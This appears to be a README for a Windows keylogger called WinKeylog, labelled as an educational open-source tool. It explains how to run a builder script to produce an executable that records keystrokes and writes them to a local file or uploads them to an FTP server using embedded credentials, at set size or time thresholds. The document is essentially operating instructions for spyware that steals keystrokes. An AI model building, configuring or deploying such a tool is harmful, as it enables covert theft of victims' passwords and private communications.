# WinKeylog
 Windows Keylogger

This is open source keylogger for educational purposes. It can send logs to `local file/ftp server`. It fully written in pure winapi.

For make new build you need to run builder:

Make new build build.exe what send logs when it equal or more than 1kb or every 5 minutes (300 seconds) to local file `%LOCALAPPDATA%\keylog.txt`

`build.py 1024 300 file “%“LOCALAPPDATA”%”\keylog.txt build.exe`

Make new build build.exe what send logs when it equal or more than 1kb or every 5 minutes (300 seconds) to FTP server 127.0.0.1 user Anon password Pass

`build.py 1024 300 ftp ftp://Anon:Pass@127.0.0.1/ build.exe`


# Source : Unknown